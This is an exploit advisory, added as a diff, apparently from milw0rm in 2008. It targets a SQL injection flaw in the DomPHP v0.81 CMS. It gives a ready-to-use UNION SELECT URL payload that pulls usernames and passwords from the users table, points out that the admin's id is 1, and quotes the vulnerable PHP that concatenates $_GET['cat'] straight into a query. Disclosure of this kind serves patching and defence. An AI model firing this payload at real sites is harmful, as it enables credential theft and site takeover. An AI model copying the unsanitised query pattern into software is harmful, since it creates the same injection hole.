@@ -1,0 +1,41 @@
+--==+================================================================================+==--
+--==+		         DomPHP v0.81 Remote Sql Injection                           +==--
+--==+================================================================================+==--
+
+ Author: MhZ91
+ Title: DomPHP v0.81 Remote Sql Injection
+ Download: http://www.domphp.com/download/cat.php?idcat=1
+ Bug: Remote Sql Injection
+ Info: DomPHP est un outil de publication entièrement modulable et surtout complètement personnalisable ! Idéal pour les experts mais aussi pour les novices désireux de présenter un site de qualité, vous allez créer votre portail ou site web en quelques clics !
+ Visit: http://www.inj3ct-it.org
+
+
+[*]----------------------------------------------------------
+
+Exploit:
+
+http://[www.example.com]/agenda/index.php?cat=-1+union+select+concat(nomUtilisateur,char(58),passUtilisateur)+from+domphp_utilisateurs+where+id_utilisateur=[UserId]/*
+
+For get the user and password, u must edit [UserId] whit an id number of members. 
+The id of admin, is 1 of default. 
+
+Vuln code in /agenda/index.php
+
+[...]
+
+if ($_GET['cat']) {
+	$cat = $_GET['cat'];
+
+	if (!$nomcat) {
+	$requete5="select nomCategorie from ".$extension."sortircat where id_categorie=$cat";
+	$result5=mysql_query($requete5, $link);
+	$recherchenomcat=mysql_fetch_object($result5);
+        $nomcat = stripslashes($recherchenomcat->nomCategorie);
+	}
+[...]
+
+There is other more sql injection... 
+
+[*]----------------------------------------------------------
+
+# milw0rm.com [2008-01-11]
